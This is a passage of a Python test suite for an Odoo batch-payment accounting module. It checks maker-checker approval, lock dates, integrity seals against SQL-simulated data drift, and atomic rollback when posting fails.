                'debit_move_id': debit.id,
                'credit_move_id': credit.id,
                'amount': 10.0,
                'debit_amount_currency': 10.0,
                'credit_amount_currency': 10.0,
            })

    def test_confirmed_source_cannot_reset_or_unlink_away_relation(self):
        """Move lifecycle cannot bypass the confirmed payment M2M freeze."""
        source = self._post_supplier_invoice(self.partner_a, 100.0)
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-04-15',
        })
        self.Wizard.create({
            'batch_id': batch.id,
            'move_ids': [(6, 0, source.ids)],
        }).action_build()
        batch.action_confirm()

        with self.assertRaisesRegex(UserError, r'\S'):
            source.button_draft()
        with self.assertRaisesRegex(UserError, r'\S'):
            source.unlink()
        with self.assertRaisesRegex(UserError, r'\S'):
            source.with_context(
                eh_authorized_batch_payment_post=True,
            ).button_draft()
        with self.assertRaisesRegex(UserError, r'\S'):
            source.with_context(
                eh_authorized_batch_payment_post=True,
            ).unlink()
        try:
            source.write({'state': 'draft'})
        except UserError:
            pass
        else:
            self.fail('raw source-state reset unexpectedly passed')
        self.assertEqual(source.state, 'posted')
        self.assertEqual(batch.payment_ids.eh_source_move_ids, source)

    def test_historical_source_account_survives_partner_property_change(self):
        source = self._post_supplier_invoice(self.partner_a, 100.0)
        source_account = source.line_ids.filtered(
            lambda line: line.account_id.account_type == 'liability_payable'
        ).account_id
        replacement = self._ensure_account(
            self.env,
            '2197',
            'Replacement Trade Payables',
            'liability_payable',
        )
        self.partner_a.with_company(self.env.company).write({
            'property_account_payable_id': replacement.id,
        })
        self.assertNotEqual(source_account, replacement)

        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-04-15',
        })
        self.Wizard.create({
            'batch_id': batch.id,
            'move_ids': [(6, 0, source.ids)],
        }).action_build()
        payment = batch.payment_ids
        self.assertEqual(payment.destination_account_id, source_account)
        self.assertNotEqual(payment.destination_account_id, replacement)

        batch.action_confirm()
        batch.with_user(self._make_checker_manager()).action_post()
        source.invalidate_recordset(['amount_residual', 'payment_state'])
        self.assertTrue(source.currency_id.is_zero(source.amount_residual))

    def test_posted_batch_settlement_is_immutable_but_liquidity_reconciles(self):
        source = self._post_supplier_invoice(self.partner_a, 100.0)
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-04-15',
        })
        self.Wizard.create({
            'batch_id': batch.id,
            'move_ids': [(6, 0, source.ids)],
        }).action_build()
        batch.action_confirm()
        batch.with_user(self._make_checker_manager()).action_post()
        payment = batch.payment_ids

        source_lines = source.line_ids.filtered(
            lambda line: line.account_id == payment.destination_account_id,
        )
        settlement = (
            source_lines.matched_debit_ids | source_lines.matched_credit_ids
        )
        self.assertTrue(settlement)
        with self.assertRaisesRegex(UserError, r'\S'):
            settlement.unlink()
        with self.assertRaisesRegex(UserError, r'\S'):
            settlement.with_user(SUPERUSER_ID).with_context(
                eh_authorized_batch_reconcile=True,
            ).unlink()

        # The protected partner-settlement evidence must not freeze the
        # separate outstanding-liquidity line. Normal statement/cash matching
        # remains a supported post-payment workflow.
        liquidity = payment._seek_for_lines()[0]
        amount = abs(sum(liquidity.mapped('balance')))
        clearing = self.post_balanced_move([
            {
                'account': payment.outstanding_account_id,
                'debit': amount,
            },
            {
                'account': self.account_cash,
                'credit': amount,
            },
        ], date=payment.date)
        clearing_line = clearing.line_ids.filtered(
            lambda line: line.account_id == payment.outstanding_account_id,
        )
        liquidity_match = liquidity + clearing_line
        if hasattr(liquidity_match, '_reconcile_plan'):
            # Bank/reconcile widgets on 17+ call this private engine directly;
            # it must receive Base's sealed-residual capability too.
            liquidity_match._reconcile_plan([liquidity_match])
        else:
            liquidity_match.reconcile()
        liquidity.invalidate_recordset(['reconciled'])
        self.assertTrue(liquidity.reconciled)

    def test_core_invoice_links_must_match_settled_documents(self):
        if 'invoice_ids' not in self.env['account.payment']._fields:
            self.skipTest('core account.payment.invoice_ids is 18+')
        source = self._post_supplier_invoice(self.partner_a, 100.0)
        conflicting = self._post_supplier_invoice(self.partner_a, 50.0)
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })

        with self.assertRaisesRegex(UserError, r'\S'):
            self.env['account.payment'].create({
                'eh_batch_payment_id': batch.id,
                'eh_source_move_ids': [(6, 0, source.ids)],
                'invoice_ids': [(6, 0, conflicting.ids)],
                'partner_id': self.partner_a.id,
                'partner_type': 'supplier',
                'payment_type': 'outbound',
                'journal_id': self.bank_journal.id,
                'amount': 100.0,
                'date': '2026-04-15',
            })
        self.assertFalse(batch.payment_ids)

    def test_authoritative_membership_rejects_hidden_corrupt_member(self):
        """Caller-filtered One2many data cannot make a member disappear."""
        batch = self._make_batch_with_one_payment()
        member = batch.payment_ids
        batch.action_confirm()
        other_company = self.env['res.company'].create({
            'name': 'Hidden Corrupt Payment Company',
        })
        # Simulate legacy/SQL corruption after approval. The checker cannot
        # rely on ordinary company record rules to see this member, but the
        # workflow's authoritative sudo query must still validate and reject it.
        self._sql_update_payment_field(
            member, 'company_id', other_company.id,
        )
        member.invalidate_recordset(['company_id'])
        batch.invalidate_recordset(['payment_ids'])

        with self.assertRaisesRegex(UserError, r'\S'):
            batch.with_user(self._make_checker_manager()).action_post()
        self.assertEqual(batch.state, 'confirmed')

    def test_post_rejects_payment_that_cannot_create_move(self):
        """An in_process state without a journal entry is never evidence."""
        batch = self._make_batch_with_one_payment()
        member = batch.payment_ids
        batch.action_confirm()
        self.env.cr.execute(
            "UPDATE account_payment SET outstanding_account_id = NULL "
            "WHERE id = %s",
            (member.id,),
        )
        member.invalidate_recordset(['outstanding_account_id'])

        with self.assertRaisesRegex(UserError, r'\S'):
            batch.with_user(self._make_checker_manager()).action_post()
        self._assert_unposted_payment_moves(member)
        self.assertEqual(batch.state, 'confirmed')

    def test_legacy_confirmed_batch_without_digest_cannot_post(self):
        batch = self._make_batch_with_one_payment()
        checker = self._make_checker_manager()
        self._sql_update_batch_fields(batch, {
            'state': 'confirmed',
            'confirmed_at': '2026-04-15 12:00:00',
            'confirmed_by_id': self.env.user.id,
            'integrity_digest': False,
        })

        with self.assertRaisesRegex(UserError, r'\S'):
            batch.with_user(checker).action_post()
        self.assertEqual(batch.state, 'confirmed')

    def test_upgrade_resets_confirmed_and_quarantines_posted_idempotently(self):
        legacy_draft = self._make_batch_with_one_payment()
        legacy_draft.sudo().with_context(**{
            AUTHORIZED_BATCH_EXPORT_CONTEXT:
                AUTHORIZED_BATCH_EXPORT_CAPABILITY,
        }).write({
            'export_file': b'bGVnYWN5LWRyYWZ0',
            'export_filename': 'legacy-draft.csv',
        })
        legacy_confirmed = self._make_batch_with_one_payment()
        legacy_confirmed.sudo().with_context(**{
            AUTHORIZED_BATCH_EXPORT_CONTEXT:
                AUTHORIZED_BATCH_EXPORT_CAPABILITY,
        }).write({
            'export_file': b'bGVnYWN5LXVucHJvdmVk',
            'export_filename': 'legacy-unproved.csv',
        })
        self._sql_update_batch_fields(legacy_confirmed, {
            'state': 'confirmed',
            'confirmed_at': '2026-04-15 12:00:00',
            'confirmed_by_id': self.env.user.id,
            'integrity_digest': False,
            'integrity_quarantined': False,
        })

        legacy_posted = self._make_batch_with_one_payment()
        legacy_posted.action_confirm()
        legacy_posted.with_user(self._make_checker_manager()).action_post()
        legacy_posted.action_export_csv()
        preserved_export = legacy_posted.export_file
        self._sql_update_batch_fields(legacy_posted, {
            'integrity_digest': False,
            'integrity_quarantined': False,
        })

        result = self.Batch._eh_quarantine_legacy_integrity()

        self.assertIn(legacy_draft.id, result['purged_draft_ids'])
        self.assertEqual(legacy_draft.state, 'draft')
        self.assertTrue(legacy_draft.integrity_quarantined)
        self.assertFalse(legacy_draft.export_file)
        self.assertIn(
            legacy_confirmed.id, result['reset_confirmed_ids'],
        )
        self.assertEqual(legacy_confirmed.state, 'draft')
        self.assertTrue(legacy_confirmed.integrity_quarantined)
        self.assertFalse(legacy_confirmed.integrity_digest)
        self.assertFalse(legacy_confirmed.confirmed_at)
        self.assertFalse(legacy_confirmed.confirmed_by_id)
        self.assertFalse(legacy_confirmed.export_file)

        self.assertIn(
            legacy_posted.id, result['quarantined_posted_ids'],
        )
        self.assertEqual(legacy_posted.state, 'posted')
        self.assertTrue(legacy_posted.integrity_quarantined)
        self.assertIn(
            legacy_posted.payment_ids.move_id.id,
            result['sealed_legacy_move_ids'],
        )
        legacy_posted.payment_ids.move_id.invalidate_recordset([
            'eh_sealed', 'eh_legacy_unverified_seal',
        ])
        self.assertFalse(legacy_posted.payment_ids.move_id.eh_sealed)
        self.assertTrue(
            legacy_posted.payment_ids.move_id.eh_legacy_unverified_seal,
        )
        legacy_posted.invalidate_recordset(['export_file'])
        with self.assertRaisesRegex(UserError, r'\S'):
            legacy_posted.export_file
        trusted_legacy = legacy_posted.sudo().with_context(**{
            AUTHORIZED_BATCH_EXPORT_CONTEXT:
                AUTHORIZED_BATCH_EXPORT_CAPABILITY,
        })
        trusted_legacy.invalidate_recordset(['export_file'])
        self.assertEqual(trusted_legacy.export_file, preserved_export)
        with self.assertRaisesRegex(UserError, r'\S'):
            legacy_posted.action_export_csv()

        self.assertEqual(
            self.Batch._eh_quarantine_legacy_integrity(),
            {
                'purged_draft_ids': [],
                'reset_confirmed_ids': [],
                'quarantined_posted_ids': [],
                'sealed_legacy_move_ids': legacy_posted.payment_ids.move_id.ids,
            },
        )

        # A human review creates the first truthful digest and releases only
        # the reset draft row from quarantine; no migration backfill does so.
        legacy_confirmed.action_confirm()
        self.assertFalse(legacy_confirmed.integrity_quarantined)
        self.assertTrue(legacy_confirmed.integrity_digest)

    def test_post_revalidates_source_payment_state(self):
        source = self._post_supplier_invoice(self.partner_a, 100.0)
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        self.env['account.payment'].create({
            'eh_batch_payment_id': batch.id,
            'eh_source_move_ids': [(6, 0, source.ids)],
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 100.0,
            'date': '2026-04-15',
        })
        batch.action_confirm()
        self.env.cr.execute(
            "UPDATE account_move SET payment_state = 'paid' WHERE id = %s",
            (source.id,),
        )
        checker = self._make_checker_manager()

        with self.assertRaisesRegex(UserError, r'\S'):
            batch.with_user(checker).action_post()
        self.assertEqual(batch.state, 'confirmed')

    def test_post_rejects_raw_source_settlement_balance_drift_atomically(self):
        # EH_SOURCE_AML_BALANCE_SEAL_REGRESSION_V1
        source = self._post_supplier_invoice(self.partner_a, 100.0)
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-04-15',
        })
        self.Wizard.create({
            'batch_id': batch.id,
            'move_ids': [(6, 0, source.ids)],
        }).action_build()
        payment = batch.payment_ids
        settlement = source.line_ids.filtered(
            lambda line: line.account_id.account_type == 'liability_payable',
        )
        settlement.ensure_one()
        batch.action_confirm()

        payload = batch._eh_integrity_payload()
        line_snapshot = payload['payments'][0]['sources'][0][
            'settlement_lines'
        ][0]
        self.assertEqual(line_snapshot['id'], settlement.id)
        expected_line_keys = {
            'id', 'move_id', 'account_id', 'partner_id', 'company_id',
            'journal_id', 'date', 'parent_state',
            'currency_id', 'company_currency_id', 'reconciled',
            'full_reconcile_id', 'matching_number',
            'debit', 'credit', 'balance', 'amount_currency',
            'amount_residual', 'amount_residual_currency',
        }
        self.assertEqual(
            set(line_snapshot),
            expected_line_keys | {'reconciliation_graph'},
        )
        graph_snapshot = line_snapshot['reconciliation_graph']
        self.assertEqual(set(graph_snapshot), {'lines', 'partials'})
        self.assertFalse(graph_snapshot['partials'])
        self.assertEqual(len(graph_snapshot['lines']), 1)
        self.assertEqual(
            set(graph_snapshot['lines'][0]),
            expected_line_keys,
        )
        self.assertEqual(graph_snapshot['lines'][0]['id'], settlement.id)
        self.assertEqual(
            line_snapshot['amount_residual'],
            repr(float(settlement.amount_residual or 0.0)),
        )

        payment_ids_before = set(self.env['account.payment'].search([]).ids)
        move_ids_before = set(self.env['account.move'].search([]).ids)
        source_residual_before = source.amount_residual
        source_payment_state_before = source.payment_state
        line_balance_before = settlement.balance
        # Raw SQL models storage/import corruption after maker approval. A
        # sub-currency-unit balance change would survive a rounded digest; the
        # exact AML seal must reject it before creating/posting any cash.
        self.env.cr.execute(
            "UPDATE account_move_line SET balance = balance + 0.001 "
            "WHERE id = %s",
            (settlement.id,),
        )
        settlement.invalidate_recordset(['balance'])

        try:
            batch.with_user(self._make_checker_manager()).action_post()
        except UserError:
            pass
        else:
            self.fail('drifted source settlement balance was posted')

        self.assertEqual(
            set(self.env['account.payment'].search([]).ids),
            payment_ids_before,
        )
        self.assertEqual(
            set(self.env['account.move'].search([]).ids),
            move_ids_before,
        )
        batch.invalidate_recordset(['state', 'posted_at', 'posted_by_id'])
        source.invalidate_recordset(['amount_residual', 'payment_state'])
        settlement.invalidate_recordset(['balance'])
        self.assertEqual(batch.state, 'confirmed')
        self.assertFalse(batch.posted_at)
        self.assertFalse(batch.posted_by_id)
        self._assert_unposted_payment_moves(payment)
        self.assertEqual(source.amount_residual, source_residual_before)
        self.assertEqual(source.payment_state, source_payment_state_before)
        self.assertAlmostEqual(
            settlement.balance,
            line_balance_before + 0.001,
        )

    def test_post_rejects_raw_source_settlement_partner_drift_atomically(self):
        # EH_SOURCE_AML_PARTNER_SEAL_REGRESSION_V1
        source = self._post_supplier_invoice(self.partner_a, 100.0)
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-04-15',
        })
        self.Wizard.create({
            'batch_id': batch.id,
            'move_ids': [(6, 0, source.ids)],
        }).action_build()
        payment = batch.payment_ids
        settlement = source.line_ids.filtered(
            lambda line: line.account_id.account_type == 'liability_payable',
        )
        settlement.ensure_one()
        batch.action_confirm()

        payment_ids_before = set(self.env['account.payment'].search([]).ids)
        move_ids_before = set(self.env['account.move'].search([]).ids)
        source_residual_before = source.amount_residual
        source_payment_state_before = source.payment_state
        self.env.cr.execute(
            "UPDATE account_move_line SET partner_id = %s WHERE id = %s",
            (self.partner_b.id, settlement.id),
        )
        settlement.invalidate_recordset(['partner_id'])

        try:
            batch.with_user(self._make_checker_manager()).action_post()
        except UserError:
            pass
        else:
            self.fail('mismatched source settlement partner was posted')

        self.assertEqual(
            set(self.env['account.payment'].search([]).ids),
            payment_ids_before,
        )
        self.assertEqual(
            set(self.env['account.move'].search([]).ids),
            move_ids_before,
        )
        batch.invalidate_recordset(['state', 'posted_at', 'posted_by_id'])
        source.invalidate_recordset(['amount_residual', 'payment_state'])
        settlement.invalidate_recordset(['partner_id'])
        self.assertEqual(batch.state, 'confirmed')
        self.assertFalse(batch.posted_at)
        self.assertFalse(batch.posted_by_id)
        self._assert_unposted_payment_moves(payment)
        self.assertEqual(source.amount_residual, source_residual_before)
        self.assertEqual(source.payment_state, source_payment_state_before)
        self.assertEqual(settlement.partner_id, self.partner_b)

    def test_post_rejects_empty_and_noop_confirmed_batches(self):
        checker = self._make_checker_manager()
        empty = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        self._sql_update_batch_fields(empty, {
            'state': 'confirmed',
            'confirmed_at': '2026-04-15 12:00:00',
            'confirmed_by_id': self.env.user.id,
        })
        with self.assertRaisesRegex(UserError, r'\S'):
            empty.with_user(checker).action_post()

        noop = self._make_batch_with_one_payment()
        noop.action_confirm()
        member = noop.payment_ids
        # Historic/SQL corruption fixture: a confirmed batch whose only
        # member already left draft must never be stamped posted as a no-op.
        self._sql_update_payment_field(
            member, 'state', self._payment_state_value('in_process'),
        )
        member.invalidate_recordset(['state'])
        with self.assertRaisesRegex(UserError, r'\S'):
            noop.with_user(checker).action_post()
        self.assertEqual(noop.state, 'confirmed')

    def test_post_blocked_when_poster_is_confirmer(self):
        """Maker-checker separation of duties: the same manager who
        confirmed the batch cannot also post it. A single manager must
        not be able to act as both maker and checker."""
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        self.env['account.payment'].create({
            'eh_batch_payment_id': batch.id,
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 100.0,
            'date': '2026-04-15',
        })
        batch.action_confirm()
        self.assertEqual(batch.confirmed_by_id, self.env.user)
        # Same user attempts to post: must be blocked.
        with self.assertRaisesRegex(UserError, r'\S'):
            batch.action_post()
        self.assertEqual(batch.state, 'confirmed')

    def test_post_succeeds_for_different_manager(self):
        """A different EH Accounting Manager (not the confirmer) may post
        the confirmed batch, satisfying the maker-checker control."""
        checker = self._make_checker_manager()
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        self.env['account.payment'].create({
            'eh_batch_payment_id': batch.id,
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 100.0,
            'date': '2026-04-15',
        })
        batch.action_confirm()
        self.assertEqual(batch.confirmed_by_id, self.env.user)

        # The second manager posts; different user than the confirmer.
        batch.with_user(checker).action_post()
        self.assertEqual(batch.state, 'posted')

    def test_member_date_divergence_is_checked_by_module_guard(self):
        if 'fiscalyear_lock_date' not in self.env['res.company']._fields:
            return
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-06-30',
        })
        self.env['account.payment'].create({
            'eh_batch_payment_id': batch.id,
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 100.0,
            'date': '2026-01-31',
        })
        batch.action_confirm()
        self._lock_company_period('2026-03-31')
        with self.assertRaisesRegex(
            UserError,
            'payment dated 2026-01-31.*accounting lock date 2026-03-31',
        ):
            batch.with_user(self._make_checker_manager()).action_post()
        self.assertEqual(batch.state, 'confirmed')

    def test_hard_lock_date_remains_absolute(self):
        if 'hard_lock_date' not in self.env['res.company']._fields:
            return
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-01-31',
        })
        self.env['account.payment'].create({
            'eh_batch_payment_id': batch.id,
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 100.0,
            'date': '2026-01-31',
        })
        batch.action_confirm()
        self.env.cr.execute(
            "UPDATE res_company SET hard_lock_date = %s WHERE id = %s",
            ('2026-03-31', self.company.id),
        )
        self.company.invalidate_recordset()
        with self.assertRaisesRegex(
            UserError,
            'Cannot post this batch.*accounting lock date 2026-03-31',
        ):
            batch.with_user(self._make_checker_manager()).action_post()

    def test_active_user_lock_exception_is_honoured(self):
        if 'account.lock_exception' not in self.env.registry:
            return
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-01-31',
        })
        self.env['account.payment'].create({
            'eh_batch_payment_id': batch.id,
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 100.0,
            'date': '2026-01-31',
        })
        batch.action_confirm()
        checker = self._make_checker_manager()
        self._lock_company_period('2026-03-31')
        self.env['account.lock_exception'].create({
            'company_id': self.company.id,
            'user_id': checker.id,
            'reason': 'Exact batch-payment lock exception regression',
            'lock_date_field': 'fiscalyear_lock_date',
            'lock_date': False,
            'company_lock_date': '2026-03-31',
        })
        self.env['res.company'].invalidate_model()
        batch.with_user(checker).action_post()
        self.assertEqual(batch.state, 'posted')
        self.assertEqual(batch.posted_by_id, checker)
        self.assertEqual(batch.payment_ids.move_id.state, 'posted')

    def test_confirm_requires_eh_manager(self):
        """The maker step (confirm) is itself manager-gated."""
        self.env.user.group_ids -= self.env.ref(
            'eh_account_base.group_eh_manager',
        )
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        self.env['account.payment'].create({
            'eh_batch_payment_id': batch.id,
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 100.0,
            'date': '2026-04-15',
        })
        with self.assertRaisesRegex(UserError, r'\S'):
            batch.action_confirm()

    # ---- robustness: all-payments-fail must not strand the batch ----

    def _make_batch_with_one_payment(self):
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
        })
        self.env['account.payment'].create({
            'eh_batch_payment_id': batch.id,
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 100.0,
            'date': '2026-04-15',
        })
        return batch

    def _make_checker_manager(self):
        """A second EH Accounting Manager, distinct from the confirmer,
        so posting satisfies the maker-checker separation."""
        suffix = self.env['res.users'].search_count([
            ('login', 'like', 'eh_checker_manager'),
        ])
        return self.env['res.users'].create({
            'name': 'Checker Manager %s' % suffix,
            'login': 'eh_checker_manager_%s' % suffix,
            'email': 'checker.manager.%s@example.com' % suffix,
            'group_ids': [(4, self.env.ref(
                'eh_account_base.group_eh_manager',
            ).id)],
        })

    def _lock_company_period(self, lock_date):
        """Establish a locked period as a test precondition. On Odoo 17 the
        account core refuses to *set* fiscalyear_lock_date while any draft
        payment move exists in that period (17 books the move on payment
        create; 18+ defer it to posting). We are exercising OUR batch guard,
        not core's set-time guard, so write the field at DB level to bypass
        that unrelated RedirectWarning cross-version."""
        company = self.env.company
        self.env.cr.execute(
            "UPDATE res_company SET fiscalyear_lock_date = %s WHERE id = %s",
            (lock_date, company.id),
        )
        company.invalidate_recordset(['fiscalyear_lock_date'])

    def test_all_payments_fail_keeps_batch_unposted(self):
        """If every payment fails to post, the batch must NOT move to
        posted. A posted batch with zero movements cannot be cancelled or
        reset, so it would otherwise be stranded forever."""
        batch = self._make_batch_with_one_payment()
        batch.action_confirm()
        checker = self._make_checker_manager()
        PaymentModel = type(self.env['account.payment'])
        with patch.object(
            PaymentModel, 'action_post',
            side_effect=UserError("forced failure"),
        ):
            try:
                batch.with_user(checker).action_post()
            except UserError:
                pass
            else:
                self.fail('failed batch unexpectedly posted')
        self.assertNotEqual(batch.state, 'posted')
        self.assertFalse(
            batch.payment_ids.filtered(lambda p: p.state in POSTED_STATES),
        )

    def test_post_rolls_back_when_source_reconciliation_is_a_noop(self):
        source = self._post_supplier_invoice(self.partner_a, 100.0)
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-04-15',
        })
        self.Wizard.create({
            'batch_id': batch.id,
            'move_ids': [(6, 0, source.ids)],
        }).action_build()
        batch.action_confirm()
        checker = self._make_checker_manager()
        PaymentModel = type(self.env['account.payment'])

        with patch.object(
            PaymentModel,
            '_eh_reconcile_sources',
            return_value=None,
        ):
            try:
                batch.with_user(checker).action_post()
            except UserError:
                pass
            else:
                self.fail('unreconciled batch unexpectedly posted')

        batch.invalidate_recordset(['state', 'export_file', 'export_hash'])
        batch.payment_ids.invalidate_recordset(['state', 'move_id'])
        source.invalidate_recordset(['amount_residual', 'payment_state'])
        self.assertEqual(batch.state, 'confirmed')
        self._assert_unposted_payment_moves(batch.payment_ids)
        self.assertAlmostEqual(source.amount_residual, 100.0)
        self.assertEqual(source.payment_state, 'not_paid')

    def test_post_rejects_raw_source_partial_graph_drift_atomically(self):
        # EH_SOURCE_PARTIAL_GRAPH_SEAL_REGRESSION_V1
        source = self._post_supplier_invoice(self.partner_a, 100.0)
        external = self.env['account.payment'].create({
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 40.0,
            'date': '2026-04-15',
        })
        external.action_post()
        open_lines = (source | external.move_id).line_ids.filtered(
            lambda line: (
                line.account_id.account_type == 'liability_payable'
                and not line.reconciled
            ),
        )
        open_lines.reconcile()
        source.invalidate_recordset(['amount_residual', 'payment_state'])
        self.assertAlmostEqual(source.amount_residual, 60.0)

        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-04-15',
        })
        self.Wizard.create({
            'batch_id': batch.id,
            'move_ids': [(6, 0, source.ids)],
        }).action_build()
        batch.action_confirm()
        source_line = source.line_ids.filtered(
            lambda line: line.account_id.account_type == 'liability_payable',
        )
        partial = (
            source_line.matched_debit_ids | source_line.matched_credit_ids
        )
        self.assertEqual(len(partial), 1)
        payment_ids_before = set(self.env['account.payment'].search([]).ids)
        move_ids_before = set(self.env['account.move'].search([]).ids)
        self.env.cr.execute(
            "UPDATE account_partial_reconcile SET amount = amount + 0.01 "
            "WHERE id = %s",
            (partial.id,),
        )
        partial.invalidate_recordset(['amount'])

        try:
            batch.with_user(self._make_checker_manager()).action_post()
        except UserError:
            pass
        else:
            self.fail('drifted source partial graph was posted')

        self.assertEqual(
            set(self.env['account.payment'].search([]).ids),
            payment_ids_before,
        )
        self.assertEqual(
            set(self.env['account.move'].search([]).ids),
            move_ids_before,
        )
        self.assertEqual(batch.state, 'confirmed')
        self._assert_unposted_payment_moves(batch.payment_ids)
        self.assertFalse(batch.export_file)
        self.assertTrue(source.currency_id.compare_amounts(
            source.amount_residual,
            60.0,
        ) == 0)

    def test_post_rejects_raw_source_counterpart_drift_atomically(self):
        # EH_SOURCE_COUNTERPART_AML_SEAL_REGRESSION_V1
        source = self._post_supplier_invoice(self.partner_a, 100.0)
        external = self.env['account.payment'].create({
            'partner_id': self.partner_a.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 40.0,
            'date': '2026-04-15',
        })
        external.action_post()
        open_lines = (source | external.move_id).line_ids.filtered(
            lambda line: (
                line.account_id.account_type == 'liability_payable'
                and not line.reconciled
            ),
        )
        open_lines.reconcile()
        source.invalidate_recordset(['amount_residual', 'payment_state'])
        self.assertAlmostEqual(source.amount_residual, 60.0)

        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-04-15',
        })
        self.Wizard.create({
            'batch_id': batch.id,
            'move_ids': [(6, 0, source.ids)],
        }).action_build()
        batch.action_confirm()
        source_line = source.line_ids.filtered(
            lambda line: line.account_id.account_type == 'liability_payable',
        )
        partial = (
            source_line.matched_debit_ids | source_line.matched_credit_ids
        )
        counterpart = (
            partial.debit_move_id | partial.credit_move_id
        ) - source_line
        self.assertEqual(len(counterpart), 1)
        payment_ids_before = set(self.env['account.payment'].search([]).ids)
        move_ids_before = set(self.env['account.move'].search([]).ids)
        self.env.cr.execute(
            "UPDATE account_move_line SET partner_id = %s WHERE id = %s",
            (self.partner_b.id, counterpart.id),
        )
        counterpart.invalidate_recordset(['partner_id'])

        try:
            batch.with_user(self._make_checker_manager()).action_post()
        except UserError:
            pass
        else:
            self.fail('drifted source counterpart journal item was posted')

        self.assertEqual(
            set(self.env['account.payment'].search([]).ids),
            payment_ids_before,
        )
        self.assertEqual(
            set(self.env['account.move'].search([]).ids),
            move_ids_before,
        )
        batch.invalidate_recordset(['state', 'export_file'])
        source.invalidate_recordset(['amount_residual'])
        counterpart.invalidate_recordset(['partner_id'])
        self.assertEqual(batch.state, 'confirmed')
        self._assert_unposted_payment_moves(batch.payment_ids)
        self.assertFalse(batch.export_file)
        self.assertEqual(counterpart.partner_id, self.partner_b)
        self.assertTrue(source.currency_id.compare_amounts(
            source.amount_residual,
            60.0,
        ) == 0)

    def test_partial_post_failure_rolls_back_every_payment(self):
        """A sibling success cannot survive a later member failure."""
        batch = self._make_batch_with_one_payment()
        second = self.env['account.payment'].create({
            'eh_batch_payment_id': batch.id,
            'partner_id': self.partner_b.id,
            'partner_type': 'supplier',
            'payment_type': 'outbound',
            'journal_id': self.bank_journal.id,
            'amount': 50.0,
            'date': '2026-04-15',
        })
        first = (batch.payment_ids - second)
        batch.action_confirm()
        checker = self._make_checker_manager()
        PaymentModel = type(self.env['account.payment'])
        real_action_post = PaymentModel.action_post

        def _post_first_fail_second(payment):
            if payment.id == first.id:
                return real_action_post(payment)
            raise UserError("second payment failed")

        with patch.object(
            PaymentModel, 'action_post', _post_first_fail_second,
        ):
            try:
                batch.with_user(checker).action_post()
            except UserError:
                pass
            else:
                self.fail('partially failed batch unexpectedly posted')

        batch.invalidate_recordset()
        self._assert_unposted_payment_moves(batch.payment_ids)
        self.assertEqual(batch.state, 'confirmed')

    def test_successful_post_moves_batch_to_posted(self):
        """A payment that posts successfully lands in 'in_process' (or
        'paid') in Odoo 19, never 'posted'. The batch must still recognise
        that as posted, move to 'posted', and count it."""
        batch = self._make_batch_with_one_payment()
        batch.action_confirm()
        checker = self._make_checker_manager()
        batch.with_user(checker).action_post()
        self.assertEqual(batch.state, 'posted')
        self.assertEqual(batch.posted_count, 1)
        self.assertEqual(batch.payment_ids.move_id.state, 'posted')

    def test_posted_batch_controlled_reversal_reopens_source(self):
        source = self._post_supplier_invoice(self.partner_a, 100.0)
        batch = self.Batch.create({
            'journal_id': self.bank_journal.id,
            'batch_type': 'outbound',
            'payment_date': '2026-04-15',
        })
        self.Wizard.create({
            'batch_id': batch.id,
            'move_ids': [(6, 0, source.ids)],
        }).action_build()
        batch.action_confirm()
        batch.with_user(self._make_checker_manager()).action_post()
        original = batch.payment_ids.move_id
        source._hash_moves(force_hash=True)
        original._hash_moves(force_hash=True)
        self.assertTrue(source.inalterable_hash)
        self.assertTrue(original.inalterable_hash)

        batch.action_reverse()

        reversal = self.env['account.move'].search([
